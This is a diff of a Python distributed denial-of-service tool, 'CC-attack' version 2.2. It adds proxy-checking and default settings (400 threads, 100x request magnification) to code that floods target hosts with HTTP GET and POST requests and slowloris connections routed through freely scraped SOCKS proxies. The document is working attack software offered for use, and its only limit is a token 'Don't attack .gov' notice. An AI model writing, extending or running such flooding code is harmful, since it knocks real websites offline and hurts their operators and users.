@@ -17,16 +17,21 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.1 (Improved threads)
-                            C0d3d by Lee0n123
-===============================================
-       --> Use 443 Port Auto Enable SSL <--
-                    Tos:
-          Don't attack .gov website
-           + Changed proxies api
-           + Improved Slow mode
-           + Added Socks5 checker
-===============================================''')
+Python3 version 2.2 (Added Human-like options)
+                            C0d3d by L330n123
+╔═════════════════════════════════════════════╗
+║       --> Use 443 Port Auto Enable SSL <--  ║
+║                    Tos:                     ║
+║          Don't attack .gov website          ║
+║─────────────────────────────────────────────║
+║                 New stuff:                  ║
+║          + Improved code performance        ║
+║          + More Human-like options          ║
+║          + Added Check proxy mode           ║
+║            (only check proxy)               ║
+║─────────────────────────────────────────────║
+║ Link: https://github.com/Leeon123/CC-attack ║
+╚═════════════════════════════════════════════╝''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -206,7 +211,7 @@ def cc(socks_type):
 			s.send(str.encode(request))
 			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
-				for y in range(multiple):
+				for _ in range(multiple):
 					s.send(str.encode(request))
 			except:
 				s.close()
@@ -245,7 +250,7 @@ def post(socks_type):
 			s.send(str.encode(request))
 			print ("[*] HTTP Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
-				for y in range(multiple):
+				for _ in range(multiple):
 					s.send(str.encode(request))
 			except:
 				s.close()
@@ -309,7 +314,8 @@ def slow(conn):
 			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
 			sys.stdout.flush()
 			pass
-def checking(lines,socks_type,ms):
+nums = 0
+def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 	global nums
 	global socks4_proxies
 	global socks5_proxies
@@ -331,12 +337,10 @@ def checking(lines,socks_type,ms):
 			socks4_proxies.remove(lines)
 		elif socks_type == 5:
 			socks5_proxies.remove(lines)
-	nums = nums + 1
+	nums += 1
 
-def check_socks(ms):
-	global proxies
+def check_socks(ms):#Coded by Leeon123
 	global nums
-	nums = 0
 	thread_list=[]
 	for lines in list(socks4_proxies):
 		th = threading.Thread(target=checking,args=(lines,4,ms,))
@@ -362,8 +366,8 @@ def check_socks(ms):
 		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
 		sys.stdout.flush()
 	print("\r\n> Checked all proxies, Total Worked:"+str(len(socks5_proxies)+len(socks4_proxies)))
-	ans = input("> Do u want to save them in a file? (y/n)")
-	if ans == "y":
+	ans = input("> Do u want to save them in a file? (y/n, default=y)")
+	if ans == "y" or ans == "":
 		print("> They are saved in socks4.txt and socks5.txt.")
 		with open("socks4.txt", 'wb') as fp:
 			for lines in list(socks4_proxies):
@@ -381,8 +385,60 @@ def main():
 	global socks4_proxies
 	global socks5_proxies
 	global multiple
-	mode = str(input("> Choose Your Mode (cc/post/slow) :"))
+	print("> Mode: [cc/post/slow/check]")
+	mode = str(input("> Choose Your Mode (default=cc) :"))
+	if mode == "":
+		mode = "cc"
+	if mode == "check":
+		N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+		if N == 'y' or N == "":
+			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
+			with open("socks4.txt",'wb') as f:
+				f.write(r.content)
+				print("> Have already downloaded socks4 list as socks4.txt")
+			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all&timeout=1000")
+			with open("socks5.txt",'wb') as f:
+				f.write(r.content)
+				print("> Have already downloaded socks5 list as socks5.txt")
+		else:
+			pass
+		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+		if out_file == '':
+			out_file = str("socks4.txt")
+		else:
+			out_file = str(out_file)
+		socks4_proxies = open(out_file).readlines()
+		out2_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+		if out2_file == '':
+			out2_file = str("socks5.txt")
+		else:
+			out2_file = str(out_file)
+		socks5_proxies = open(out2_file).readlines()
+		print ("> Number Of Socks4/5 Proxies: %s" %(len(socks4_proxies)+len(socks5_proxies)))
+		time.sleep(0.03)
+		ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+		if ans == "":
+			ans = "y"
+		if url == '':
+			url2 = "/"
+		else:
+			url2 = str(url)
+		if ans == "y":
+			ms = str(input("> Delay of socks(seconds, default=1):"))
+			if ms == "":
+				ms = int(1)
+			else :
+				try:
+					ms = int(ms)
+				except :
+					ms = float(ms)
+			check_socks(ms)
+		print("> End of process")	
+
 	ip = str(input("> Host/Ip:"))
+	if ip == "":
+		print("> Plese enter correct host or ip")
+		sys.exit(0)
 	if mode == "slow":
 		pass
 	else:
@@ -395,9 +451,16 @@ def main():
 		port = int(port)
 		if str(port) == '443':
 			print(" [!] Enable SSL Mode")
-	thread_num = int(input("> Threads:"))
-	N = str(input("> Do you need to get socks list?(y/n):"))
-	if N == 'y':
+	thread_num = str(input("> Threads(default=400):"))
+	if thread_num == "":
+		thread_num = int(400)
+	else:
+		try:
+			thread_num = int(thread_num)
+		except:
+			sys.exit("Error thread number")
+	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+	if N == 'y' or N == "":
 		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all&timeout=1000")
 		with open("socks4.txt",'wb') as f:
 			f.write(r.content)
@@ -422,7 +485,9 @@ def main():
 	socks5_proxies = open(out2_file).readlines()
 	print ("> Number Of Socks4/5 Proxies: %s" %(len(socks4_proxies)+len(socks5_proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Do u need to check the socks list?(y/n):"))
+	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+	if ans == "":
+		ans = "y"
 	if url == '':
 		url2 = "/"
 	else:
@@ -438,22 +503,24 @@ def main():
 				ms = float(ms)
 		check_socks(ms)
 	if mode == "slow":
+		input("Press Enter to continue.")
 		slow(thread_num)
-	multiple = int(input("> Input the Magnification:"))
+	multiple = str(input("> Input the Magnification(default=100):"))
+	if multiple == "":
+		multiple = int(100)
+	else:
+		multiple = int(multiple)
 	input("Press Enter to continue.")
 	if mode == "post":
-		for i in range(thread_num):
+		for _ in range(thread_num):
 			th = threading.Thread(target = post,args=(random.randint(4,5),))
 			th.start()
-			print("Threads "+str(i+1)+" created")
+			#print("Threads "+str(i+1)+" created")
 	elif mode == "cc":
-		for i in range(thread_num):
+		for _ in range(thread_num):
 			th = threading.Thread(target = cc,args=(random.randint(4,5),))
 			th.start()
-			print("Threads "+str(i+1)+" created")
-	else:
-		print("[!] Input Error")
-		sys.exit()
+			#print("Threads "+str(i+1)+" created")
 
 if __name__ == "__main__":
-	main()
+	main()#Coded by Leeon123
